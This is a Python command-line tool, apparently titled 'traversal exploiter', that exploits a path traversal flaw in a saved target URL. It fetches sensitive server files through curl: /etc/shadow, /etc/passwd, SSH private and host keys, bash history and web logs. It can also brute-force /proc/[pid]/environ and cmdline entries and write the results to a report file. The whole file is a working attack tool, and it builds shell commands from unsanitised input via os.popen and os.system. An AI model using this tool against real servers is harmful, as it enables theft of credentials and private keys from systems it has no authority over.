#!/bin/env python3
"""
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Boris Burgarella wrote this file. As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return
 * ----------------------------------------------------------------------------
"""

import argparse
import os
import sys

# some nice colors !!
HEADER = '\033[95m'
BLUE = '\033[94m'
CYAN = '\033[96m'
GREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

commonFiles = [	"/etc/issue","/etc/motd","/etc/resolv.conf","/proc/version","/etc/profile","/etc/bashrc", "~/.bash_profile", "~./bashrc", 
				"~/.bash_logout","/etc/mtab","/etc/inetd.conf","/var/log/dmessage", "/etc/httpd/logs/acces_log", "/etc/httpd/logs/error_log", 
				"/var/www/logs/access_log", "/var/www/logs/access.log", "/usr/local/apache/logs/access_ log", "/usr/local/apache/logs/access. log" ,
				"/var/log/apache/access_log" , "/var/log/apache2/access_log" , "/var/log/apache/access.log" , "/var/log/apache2/access.log",
				"/var/log/access_log",
	     	   	"/etc/services","/etc/passwd", "/etc/group", "/etc/shadow", "~/.bash_history", "~/.profile","~/.ssh/authorized_keys",
		 		"~/.ssh/identity.pub", "~/.ssh/identity", "~/.ssh/id_rsa.pub", "~/.ssh/id_rsa", "~/.ssh/id_dsa.pub", "~/.ssh/id_dsa",
				"/etc/ssh/ssh_config", "/etc/ssh/sshd_config","/etc/ssh/ssh_host_dsa_key.pub", "/etc/ssh/ssh_host_dsa_key",
			 	"/etc/ssh/ssh_host_rsa_key.pub", "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_key.pub", "/etc/ssh/ssh_host_key"]

procNames = ["cmdline","cwd","environ","fd","root", "version", "mounts"]

Header = BLUE + BOLD + """
===============================================================================================================================
_____                                                             _______________              ______                         
__  /_____________ _________________   __________________________ ___  /__  ____/___  ____________  /_________________________
_  __/_  ___/  __ `/_  __ \_  ___/_ | / /  _ \_  ___/_  ___/  __ `/_  /__  __/  __  |/_/__  __ \_  /_  __ \_  ___/  _ \_  ___/
/ /_ _  /   / /_/ /_  / / /(__  )__ |/ //  __/  /   _(__  )/ /_/ /_  / _  /___  __>  < __  /_/ /  / / /_/ /  /   /  __/  /    
\__/ /_/    \__,_/ /_/ /_//____/ _____/ \___//_/    /____/ \__,_/ /_/  /_____/  /_/|_| _  .___//_/  \____//_/    \___//_/     
                                                                                       /_/                                    
														    by Trefle
===============================================================================================================================
""" + ENDC

def print_with_colors(Text_str, color, **kwargs):
    print(color + Text_str + ENDC, **kwargs)



if __name__ == "__main__":
	# mandatory header print :P
	print(Header)
	# get the args
	
	if os.path.exists("vulnUrl.txt"):	
		with open('vulnUrl.txt','r') as file:
			url = file.read()
	else:
		url = input("No saved url found, please enter the target vulnerable url:\n")
		print("Thank you ! this url will be saved in a file name vulnUrl.txt in the working directory")
		with open('vulnUrl.txt','w') as file:
			file.write(url) 

	if "--download" in sys.argv or "-d" in sys.argv:
		path = sys.argv[-1]
		command = "curl {}{} > {}".format(url, path, path.split('/')[-1])
		print_with_colors("Downloading the file: {}                     ".format(path),BLUE, end="\r")
		os.popen(command).read()
		result = open('{}'.format(path.replace('/','_')),'r')
		# I include this try /except for binary files
		# to avoid triggering a bug
		try:
			if result.read().strip() == '':
				print('\nEmpty file')
				os.system('rm {}'.format(path.replace('/','_')))
		except:
			pass
		result.close()
		quit()

	if "--brute-force-proc" in sys.argv or "-bf" in sys.argv:
		try:
			pos = sys.argv.index('--brute-force-proc')
		except:
			pos = sys.argv.index('-bf')

		try:
			maxPID = sys.argv[pos+1]
		except:
			print_with_colors("Error: the /proc brute force should be used as: -bf [maxPID]",FAIL)
		
		with open("trReport.txt","w") as file:
			for i in range(int(maxPID)):
				if i == 0:
					PID = "self"
				else:
					PID = i
				for entry in procNames:
					command = "curl -s {}/proc/{}/{}".format(url, PID, entry)
					print_with_colors("Getting the content of the file: /proc/{}/{}                        ".format(PID, entry),BLUE, end='\r')
					result = os.popen(command).read()
					if result.strip() != '':
						print("\nFound something !")
						file.write(BLUE + "\nContent of the file:/proc/{}/{} \n===========================\n".format(PID, entry) + ENDC)
						file.write(result)
						file.flush()




	if sys.argv[-1] == "--common-files" or sys.argv[-1] == "-cf":
		with open("trReport.txt","w") as file:	
			for path in commonFiles:
				command = "curl -s {}{}".format(url, path)
				print_with_colors("Getting the content of the file: {}                     ".format(path),BLUE, end="\r")
				result = os.popen(command).read()
				if result.strip() != '':
					print("\nFound something !")
					file.write(BLUE + "\nContent of the file:{}\n===========================\n".format(path) + ENDC)
					file.write(result)
	else:
		path = sys.argv[-1]
		command = "curl {}{}".format(url, path)
		print_with_colors("Getting the content of the file:\n===========================",BLUE)
		result = os.popen(command).read()
		print_with_colors("\nContent of the file:\n===========================",BLUE)
		print(result)
